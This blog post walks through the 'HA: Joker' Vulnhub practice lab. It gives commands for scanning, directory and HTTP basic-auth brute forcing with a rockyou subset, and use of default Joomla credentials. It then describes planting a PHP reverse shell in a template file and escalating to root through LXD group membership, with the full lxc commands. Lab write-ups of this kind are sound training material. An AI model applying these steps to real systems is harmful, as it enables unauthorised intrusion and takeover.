---
title: 'HA Joker Vulnhub Walkthrough'
date: 2019-10-21T14:37:00+01:00
draft: false
---

Today we are going to solve our Boot to Root challenge called “HA: Joker” We have developed this lab for the purpose of online penetration practices. Solving this lab is not that tough if you have proper basic knowledge of Penetration testing. Let’s start and learn how to breach it.

Download **[Here](https://www.vulnhub.com/entry/ha-joker,379/)**

Level: Intermediate

Task: Find Root Flag on the Target Machine.

### **Penetration Methodologies**

*   **Scanning Network**
    *   Netdiscover
    *   Nmap
*   **Enumeration**
    *   Browsing HTTP Service
    *   Performing Directory Brute force
    *   Performing Bruteforce on Joomla
*   **Exploitation**
    *   Exploiting the Joomla
    *   Getting a reverse connection
    *   Spawning a TTY Shell
*   **Privilege Escalation**
    *   LXD

### **Walkthrough**

### **Scanning Network**

First of all, we try to identify our target. We did this using the netdiscover command. It came out to be

Now that we have identified our target using the above command, we can continue on to our second step that is scanning the target. We will use nmap to scan the target with the following command:

```
nmap -A 192.168.1.101
```

![](https://i1.wp.com/1.bp.blogspot.com/-O2WRuqBYa54/Xa2gx1gfqAI/AAAAAAAAhEo/6M_b4gTog0cqBdH0pMjwtdLyG7g4Zy4NgCLcBGAsYHQ/s1600/1.png?w=687&ssl=1)

### **Enumeration**

With the help of the scan, we now know that port number 22, 80 and 8080 are open with the service of SSH, HTTP respectively. Now that port 80 is open, so we opened the target IP address in our browser as shown in the following image:

```
http://192.168.1.101
```

This gave us a collection of Joker Quotes from his appearance over time in the comics and the movies. We also inspected the source code of this webpage, it was also riddled with the commented joker quotes.

![](https://i1.wp.com/1.bp.blogspot.com/--V1Cb5O6q10/Xa2g1LPLxHI/AAAAAAAAhFQ/lcj7Uo99visK9UGkzalMlHb-2wNKe7GNwCLcBGAsYHQ/s1600/2.png?w=687&ssl=1)

As we couldn’t find anything of much use on the webpage hosted on the port 80, we decided to enumerate the service running on the port 8080. This was surprisingly only accessible to an authorized user with proper credentials as shown in the image given below. It’s time to look for these credentials.

```
http://192.168.1.101:8080
```

![](https://i0.wp.com/1.bp.blogspot.com/-bB4issu-esk/Xa2g2Mhjn4I/AAAAAAAAhFY/Bvofj9I0rkgPdlLr-i9OfPg-v0mg8BVOACLcBGAsYHQ/s1600/3.png?w=687&ssl=1)

Now while we were busy browsing the webpages, we also started a directory bruteforce scan using the dirb tool. We applied different variants of scans with different extensions. We got success with the .txt extension. We found the secret.txt.

```
dirb http://192.168.1.101/ -X .txt
```

![](https://i1.wp.com/1.bp.blogspot.com/-Ag0oJTAs0zo/Xa2g2FrLRTI/AAAAAAAAhFc/utm1qeM435UH0NIZKbl4guDxG7aqnBS9QCLcBGAsYHQ/s1600/4.png?w=687&ssl=1)

Now that we have found the secret.txt file. It contained a conversation between Batman and our beloved Joker. Here there was a repeat mention of the word ‘rock’ this struck us as ‘rockyou.txt’ the famous bruteforce dictionary. Also, there was a mention of the ‘one of your 100 poor jokes’. It was a bizarre mention of the word 100. So what we accumulated from this was that the password for the panel at port 8080. Must be in the top 100 passwords of the Rockyou dictionary.

```
wget http://192.168.1.101/secret.txt  
cat secret.txt
```

![](https://i1.wp.com/1.bp.blogspot.com/-7GM170s_l1E/Xa2g2SGWFoI/AAAAAAAAhFg/_BNf-gaZFZs60TsnlW3WWHUFCqaEwgI_gCLcBGAsYHQ/s1600/5.png?w=687&ssl=1)

Now that we have formulated a plan to use the top 100 passwords from the rockyou.txt dictionary, it’s time to compile a smaller dictionary of those 100 passwords so as to make the bruteforce faster and lighter. To do this we are going to use the head command.  From the head command, we are going to pass the parameter of 100 keywords and direct the output generated by this command in a text file using the greater than (>) symbol.

```
head -n 100 rockyou.txt > dict.txt
```

![](https://i1.wp.com/1.bp.blogspot.com/-l4oVddml0lg/Xa2g2o3nrAI/AAAAAAAAhFk/XdhAvimc56UHKGW5rD1Ipl55aQeV4jidQCLcBGAsYHQ/s1600/6.png?w=687&ssl=1)

Now as this is a web application and we are required to perform a brute force, we are going to use the BurpSuite Application. For that, we are going to open the webpage hosted on the port 8080 and enter any random characters in the login panel and press the OK button after applying the burp proxy.

![](https://i2.wp.com/1.bp.blogspot.com/-AhnbyXAmMbI/Xa2g3OhTuzI/AAAAAAAAhFo/pdGwoZIWeZUon71dyIXMpgsG4M4tEp5ygCLcBGAsYHQ/s1600/7.png?w=687&ssl=1)

As we started the BurpSuite and clicked on the OK button after applying the proper proxy, and enabling the Intercept option on the BurpSuite, we are able to capture a request that was generated. Further on, we right-clicked on the request captured and selected the option “Send to Intruder”.

![](https://i1.wp.com/1.bp.blogspot.com/-ePaP8qI5Yns/Xa2g3C4uALI/AAAAAAAAhFs/sVsEp4MD9Zs5_NNvSFpfeUPFNW1lhC2SwCLcBGAsYHQ/s1600/8.png?w=687&ssl=1)

After Sending it to Intruder, we are going to check the Intruder tab for the transferred request. Here in the Intruder section, we are going to get into the Positions Tab. Here we select the Attack type to be Sniper. We will select the Authorization hash and Click on the Add Button on the right side.

![](https://i2.wp.com/1.bp.blogspot.com/-o5sECBGgfJs/Xa2g3tN--EI/AAAAAAAAhFw/UnKVzebP_koRlsqxOAktnJEIc8Z_tFuVQCLcBGAsYHQ/s1600/9.png?w=687&ssl=1)

The base64 encoded value of Authentication is a combination of username and password now the scenario is to generate the same encoded value of authentication with the help of user password dictionary, Therefore, I have made a dictionary which contains both user password names in a text file.

In order to use the dictionary as payload click on **payload tab** under intruder**; **now **load** your dictionary which contains user password names from **payload options**.

So we are going to modify the dictionary we created earlier by adding the username as ‘joker’ followed by a ‘:’. So that it might look like:

```
joker:password
```

![](https://i2.wp.com/1.bp.blogspot.com/-6MueCswfgj0/Xa2gyM7k7fI/AAAAAAAAhEs/gbQKKNk9YwUVQuOkTDqO6f6BUaM85x4OQCLcBGAsYHQ/s1600/10.png?w=687&ssl=1)

After applying the above-stated settings, we went back to the Positions Tab and Clicked on the “Start Attack Button”. The Bruteforce starts and gives the result. Here we are going to get a lot of 401 errors. But we will have to find the entry with the 200 code.

![](https://i1.wp.com/1.bp.blogspot.com/-ugUDKlm4A4Y/Xa2gx0kxosI/AAAAAAAAhEk/FLok48Rv45oYqKCuJ23L4x182_xTgUi6QCLcBGAsYHQ/s1600/11.png?w=687&ssl=1)

As this text is encoded in the Base64 Encryption. We converted it into the Plain Text. Upon conversion, it came out to be:

```
joker:hannah
```

![](https://i1.wp.com/1.bp.blogspot.com/-GTgMUETsleM/Xa2gyyBWvFI/AAAAAAAAhEw/-M-FK08fDjc4omFhXOEmpkRClY3-sTk1QCLcBGAsYHQ/s1600/12.png?w=687&ssl=1)

We went back to the login panel and entered the username as ‘joker’ and password as ‘hannah’. This was a successful login. And we could see the Joomla Website as shown in the given image.

![](https://i0.wp.com/1.bp.blogspot.com/-hl-FO73nFhM/Xa2gy53D-sI/AAAAAAAAhE0/eAbtO1Yubn0fjyUaU3l2LNaW3zi6tiepACLcBGAsYHQ/s1600/13.png?w=687&ssl=1)

As this is a Joomla website, its login panel must be at /administrator. So we surfed that URL in our Browser. Here we got stopped by another login panel. After a brief searching over the internet, we found that the default credentials of Joomla are ‘joomla:joomla’. So, before trying anything else, we will be trying these login credentials.

![](https://i1.wp.com/1.bp.blogspot.com/-poxN4hyQxv0/Xa2gzA1FAwI/AAAAAAAAhE4/1qLGmaXzKIgFh2kUeZUwob3YgB7zZqpbgCLcBGAsYHQ/s1600/14.png?w=687&ssl=1)

Now that we have logged in on the Joomla as the SuperUser. To exploit the Joomla server, we will use the PHP reverse shell. They can be found in Kali Linux. We will move on to the Template Section. To do so, we will first click on the Extensions Option on the Menu. Then, traverse in the beez3 template and choose Customise. This is open an edit section as shown in the image. Now, select the index.php and replace the text inside the index.php with our reverse shell. Remember to change the IP Address and/or change the port.

![](https://i1.wp.com/1.bp.blogspot.com/-hzzLMpLibq8/Xa2gzg3nWeI/AAAAAAAAhE8/DUuWtX5xq4YzA_h3BC5jj_4w0yubUOW9ACLcBGAsYHQ/s1600/15.png?w=687&ssl=1)

After editing the index.php, save the file by clicking on the Save Button. Now we have successfully replaced the index.php with our reverse shell script. Now, all that’s left to do is run the index.php. Now to get a session, we need a listener, where we will get our reverse shell. We will use netcat for creating a listener as shown in the image given below

After we got the shell, we saw that the shell that we got is an improper shell, so we used the python one-liner to convert it into a proper shell. After conversion, we ran the id command. We saw that this shell is of the user ‘www-data’. We saw that this user is a part of the lxd group. This could be our way to root.

```
python3 -c 'import pty;pty.spawn("/bin/bash")'  
id
```

![](https://i0.wp.com/1.bp.blogspot.com/-D6dxYGKrJ_M/Xa2gz-7UVkI/AAAAAAAAhFA/f3Em8hQA9kAzrn7PdAK6rIdJGeM2FsURACLcBGAsYHQ/s1600/16.png?w=687&ssl=1)

### **Privilege Escalation**

To learn the Lxd privilege escalation in detail, refer to this article: “**[Lxd Privilege Escalation](https://www.hackingarticles.in/lxd-privilege-escalation/)**”.

In order to take escalate the root privilege of the target machine, we will have to create an image for lxd. To that, we will first, Download build-alpine in the attacker machine (Kali Linux) through the git repository. After that, we will be traversing it into the lxd-alpine-builder directory and execute the script “build -alpine” that will build the latest Alpine image as a compressed file.

```
git clone https://github.com/saghul/lxd-alpine-builder.git  
cd lxd-alpine-builder  
./build-alpine
```

![](https://i0.wp.com/1.bp.blogspot.com/-bhb5N7Z3II4/Xa2gz--IvII/AAAAAAAAhFE/ls728SLYODY0EuDTtdzSM3nJRu7gQTkzACLcBGAsYHQ/s1600/17.png?w=687&ssl=1)

Now we will send the tar file to the target machine. We will be using the Python HTTP server for this transfer.

```
ls  
python -m SimpleHTTPServer
```

![](https://i1.wp.com/1.bp.blogspot.com/-64JLvIq29eA/Xa2g0dc-YUI/AAAAAAAAhFI/Gay6ApKGZLkOup8yLQPGuVSfBww5zYp0wCLcBGAsYHQ/s1600/18.png?w=687&ssl=1)

On the target machine, firstly we will be downloading the alpine image followed by importing an image for lxd. After that, we will be Initializing the image inside a new container.

```
wget http://192.168.1.107:8000/alpine-v3.10-x86\_64-20191019\_0712.tar.gz  
lxc image import ./alpine-v3.10-x86\_64-20191019\_0712.tar.gz --alias myimage  
lxc image list
```

![](https://i1.wp.com/1.bp.blogspot.com/-_U5Cnnf-x58/Xa2g0071aKI/AAAAAAAAhFM/rH-L4cDgRagI3hWVjQaC79j1s9cwJQzagCLcBGAsYHQ/s1600/19.png?w=687&ssl=1)

Finally, we will be mounting the container inside the /root directory. Once inside the container, navigate to /mnt/root to see all resources from the target machine. After running the bash file. We see that we have a different shell, it is the shell of the container. This container has all the files of the host machine. So, we enumerated for the flag here and we found the final.txt. This concludes this Boot to Root Challenge.

```
lxc init myimage ignite -c security.privileged=true  
lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true  
lxc start ignite  
lxc exec ignite /bin/sh  
id  
cd /mnt/root/root  
ls  
cat final.txt
```

![](https://i1.wp.com/1.bp.blogspot.com/-lIGWP201EQk/Xa2g1Vpou8I/AAAAAAAAhFU/RYs14pFyf08Av3AnEVM5bM1VrsKcS-K3wCLcBGAsYHQ/s1600/20.png?w=687&ssl=1)

**Author: Pavandeep Singh** is a Technical Writer, Researcher and Penetration Tester Contact **[here](https://www.linkedin.com/in/pavandeep-singh-6b1074132)**

The post [HA Joker Vulnhub Walkthrough](https://www.hackingarticles.in/ha-joker-vulnhub-walkthrough/) appeared first on [Hacking Articles](https://www.hackingarticles.in).

  
  
from Hacking Articles https://ift.tt/2o8rrxO